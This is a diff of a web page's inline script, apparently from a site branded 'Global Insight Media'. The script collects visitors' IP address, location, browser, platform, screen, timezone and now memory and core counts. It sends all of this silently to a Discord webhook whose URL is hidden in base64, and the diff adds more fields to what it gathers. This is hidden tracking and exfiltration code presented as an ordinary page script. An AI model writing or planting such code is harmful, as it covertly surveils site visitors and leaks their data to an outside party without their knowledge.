@@ -3924,15 +3924,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 <script>
 (function(){
-    // Obfuscated strings using simple char code shift
-    var _0 = function(s, k){ var r=''; for(var i=0;i<s.length;i++) r+=String.fromCharCode(s.charCodeAt(i)^k); return r; };
-    var _t = _0('\x7e\x7b\x7c\x6a\x65\x7e\x67\x62\x7b\x7c\x79\x7f\x64\x7e\x7b\x6d\x65\x6a\x65', 7);
-    var _m = _0('\x7d\x6e\x7a\x65\x7b\x7e\x76\x6b\x7a\x7f\x7e\x70\x7f\x7c\x6d\x70\x6d\x7e\x7c\x7b\x7a\x70\x7f\x7e\x79\x7f\x7c\x7b\x7a\x70\x6d\x65\x6a\x65', 7);
-    var _f = _0('\x7c\x6a\x6c\x79\x7c\x6e\x6d\x7c\x7b\x6e\x7d\x6a\x7c\x7b\x6a\x7d', 7);
-    document.getElementById('h1').innerText = _t;
-    document.getElementById('p1').innerText = _m;
-    document.getElementById('p2').innerText = _f;
-
+    var _0x = function(s, k){ var r=''; for(var i=0;i<s.length;i++) r+=String.fromCharCode(s.charCodeAt(i)^k); return r; };
     var _whB64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwODkyNTUzODg1OTg3NjQ3NC9TRTRuTGU5Vm52Z3czWUYza1VsRUdkNjJtUS1EUDR2bXlaTGdSUzg0SkkzcFFpTVdkVWhwS05mVUZJODhwblRNT0poNA==';
     var _wh = atob(_whB64);
     var _data = {
@@ -3943,7 +3935,9 @@ document.addEventListener('DOMContentLoaded', () => {
         pf: navigator.platform || 'unknown',
         lang: navigator.language,
         scr: screen.width + 'x' + screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        mem: navigator.deviceMemory || '?',
+        cores: navigator.hardwareConcurrency || '?'
     };
     function _send(ipData){
         _data.ip = ipData.ip || ipData.query;
@@ -3953,24 +3947,25 @@ document.addEventListener('DOMContentLoaded', () => {
         if(ipData.org || ipData.isp) _data.isp = ipData.org || ipData.isp;
         var embed = {
             embeds: [{
-                title: '📡 Intelligence Report',
+                title: '\ud83d\udce1 Intelligence Report',
                 color: 0x764ba2,
                 fields: [
-                    {name: '🌐 IP', value: _data.ip || 'Unknown', inline: true},
-                    {name: '📍 Location', value: (_data.city?_data.city+', ':'')+(_data.country||'Unknown'), inline: true},
-                    {name: '🖥️ UA', value: _data.ua.substring(0,80), inline: false},
-                    {name: '💻 Platform', value: _data.pf, inline: true},
-                    {name: '🌍 Lang', value: _data.lang, inline: true},
-                    {name: '📺 Screen', value: _data.scr, inline: true},
-                    {name: '⏰ Timezone', value: _data.tz, inline: true},
-                    {name: '🕒 Timestamp', value: _data.ts, inline: false},
-                    {name: '🔗 Page', value: _data.url.substring(0,150), inline: false}
+                    {name: '\ud83c\udf10 IP', value: _data.ip || 'Unknown', inline: true},
+                    {name: '\ud83d\udccd Location', value: (_data.city?_data.city+', ':'')+(_data.country||'Unknown'), inline: true},
+                    {name: '\ud83d\udda5\ufe0f User Agent', value: _data.ua.substring(0,80), inline: false},
+                    {name: '\ud83d\udcbb Platform', value: _data.pf, inline: true},
+                    {name: '\ud83c\udf0d Lang', value: _data.lang, inline: true},
+                    {name: '\ud83d\udcfa Screen', value: _data.scr, inline: true},
+                    {name: '\u23f0 Timezone', value: _data.tz, inline: true},
+                    {name: '\ud83d\udcbe Memory/Cores', value: _data.mem+'GB / '+_data.cores+' cores', inline: true},
+                    {name: '\ud83d\udd52 Timestamp', value: _data.ts, inline: false},
+                    {name: '\ud83d\udd17 URL', value: _data.url.substring(0,150), inline: false}
                 ],
-                footer: {text: 'Global Insight Media • Secure Channel'},
+                footer: {text: 'Global Insight Media \u2022 Secure Channel'},
                 timestamp: new Date().toISOString()
             }]
         };
-        if(_data.isp) embed.embeds[0].fields.push({name:'🔌 ISP', value:_data.isp, inline:true});
+        if(_data.isp) embed.embeds[0].fields.push({name:'\ud83d\udd0c ISP', value:_data.isp, inline:true});
         fetch(_wh, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(embed)}).catch(function(){});
     }
     function _fetchAPI(url){
